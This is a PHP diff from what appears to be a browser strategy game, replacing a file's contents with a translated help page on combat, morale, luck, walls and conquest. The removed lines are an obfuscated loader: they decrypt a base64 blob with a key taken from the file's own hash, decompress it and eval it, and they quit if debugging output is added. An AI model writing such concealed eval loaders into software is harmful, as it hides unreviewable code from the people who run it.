@@ -1,24 +1,41 @@
 <?php
-$mmnrcriw="9b1b68609e65cdb04e4e9b0661e7740c";
-$xojyykc="0f010807050f52055a01520d070101560d570704585504050f05570655515251";
-$uhwzhcj="Trm08Xy4vxVzoYuplnjzM/DfkgfKipF9S9yXppS9KWcXo/0j8jthidiNwxdcgbxct994w5Gso0raTaZqsf2HMFWXND91Cp4b9yXbnBw4TQw8vhmV4LTq+sPfQIC/SXVXxQZqC+S/9Load7y6kxDm8We7z3K7WX4vqTSoiv6xvHDUL/nH0cQ5h2YvS6qrhvEhqWbxkErWPIB+iMHlFcvNaqP7vHcnqTylf5uqQ/Y1jYNyzDQMZn3JelVFBwnIwcF+vwmvMB7coiZlXpHLvIp2W+aG0OzJjQD8CIsoSY2WmDVU48bGbdunfOKWses35l3FBU6MwJeXkdMuEq2rKw0UUBzJ2p4tcsFZCIBIZwPQxsCoLviRvjlv+X1VRqxDz54IRb8zxG6bC3R06DIcDgG0ZMFkUs6lNLEp2RbDwf8his/9e06TeaJ+RqVezRLNDuRFTOfo7k8bV3CKvd+5N5JYg9+QRxnwB5pDoR1WD6OC4S2Z3X7YsuVXlLgpv8WIjo4VBkiryF9FPj9t5Vj0LCNBYZDa5wi6oig4sTnDORNjL76G50Mq4MGRVNqp7TknP8oFb7wU4ron5r2awD76i74ai7dT7IZmZ8DzEowYvmNrTKQn7MZcV5EnfbUhCciUzQdosQONJ8hJXjgXEtjD5dmIEB7L18Klyh+q55rrxvljTRRa/HyqXyOZOlsmTDQ=";
-$lxuzimxgs=file_get_contents(__FILE__);
-$lwtsepn=str_replace($uhwzhcj,"",$lxuzimxgs);
-if(strpos($lwtsepn,"ec"."ho")!==false||strpos($lwtsepn,"pr"."int")!==false||strpos($lwtsepn,"var_"."dump")!==false||strpos($lwtsepn,"file_put_"."contents")!==false||strpos($lwtsepn,"fw"."rite")!==false){die();}
-$aopfwldm=str_replace(array($mmnrcriw,$xojyykc),array("SP_c848b27a","KP_e18dde28"),$lxuzimxgs);
-$fejqlr=md5($aopfwldm);
-$gpdbwcvx=hex2bin($xojyykc);
-$mhnzhla="";
-$ltvirhn=strlen($fejqlr);
-for($tsgszomwt=0;$tsgszomwt<$ltvirhn;$tsgszomwt++){
-$mhnzhla.=chr(ord($gpdbwcvx[$tsgszomwt])^ord($fejqlr[$tsgszomwt]));
-}
-$wrwnpw=base64_decode($uhwzhcj);
-$zslxndua=strlen($wrwnpw);
-$isupqczvn="";
-$yhltiezvfrf=strlen($mhnzhla);
-for($tsgszomwt=0;$tsgszomwt<$zslxndua;$tsgszomwt++){
-$isupqczvn.=$wrwnpw[$tsgszomwt]^$mhnzhla[$tsgszomwt%$yhltiezvfrf];
-}
-$edfbcjjnqh="gzun"."compress";
-eval('?>' . $edfbcjjnqh($isupqczvn) . '<?php ');
+// Combat Help View
+global $config;
+?>
+<h1><?= __('help.combat.title') ?></h1>
+<p><?= __('help.combat.intro') ?></p>
+
+<h3><?= __('help.combat.morale') ?></h3>
+<p><?= __('help.combat.morale_desc') ?></p>
+<p><b><?= __('help.combat.morale_status') ?>:</b>
+    <?= $config['moral_activ'] ? __('help.combat.active') : __('help.combat.disabled') ?></p>
+
+<h3><?= __('help.combat.night_bonus') ?></h3>
+<p><?= __('help.combat.night_bonus_desc') ?></p>
+<p><b><?= __('help.combat.schedule') ?>:</b>
+    <?= $config['noc'] ? $config['noc_poczatek'] . ':00h - ' . $config['noc_koniec'] . ':00h' : __('help.combat.disabled') ?>
+</p>
+
+<h3><?= __('help.combat.luck') ?> <img src="graphic/icons/rabe.png" alt="screens.common.bad_luck"> <img src="/graphic/icons/klee.png" alt="screens.common.good_luck"> </h3>
+<p><?= __('help.combat.luck_desc') ?></p>
+
+<h3><?= __('help.combat.wall') ?> <img src="graphic/buildings/wall.png" alt="Muralha"></h3>
+<p><?= __('help.combat.wall_desc') ?></p>
+
+<hr>
+
+<h1><?= __('help.combat.conquest_title') ?></h1>
+<p><?= __('help.combat.conquest_intro') ?> <img src="/graphic/unit/snob.png" title="Nobre" alt=""></p>
+
+<h3><?= __('help.combat.loyalty') ?></h3>
+<p><?= __('help.combat.loyalty_desc') ?></p>
+<ul>
+    <li><b><?= __('help.combat.reduction_per_attack') ?>:</b> <?= $config['pop_min'] ?> <?= __('help.combat.to') ?>
+        <?= $config['pop_max'] ?> <?= __('help.combat.points') ?>.
+    </li>
+    <li><b><?= __('help.combat.recovery') ?>:</b> <?= __('help.combat.loyalty_recovery_prefix') ?>
+        <?= $config['agreement_per_hour'] ?> <?= __('help.combat.loyalty_recovery_suffix') ?></li>
+</ul>
+
+<p><?= __('help.combat.conquest_desc') ?></p>
+<p><b><?= __('help.combat.note') ?>:</b> <?= __('help.combat.conquest_note') ?></p>
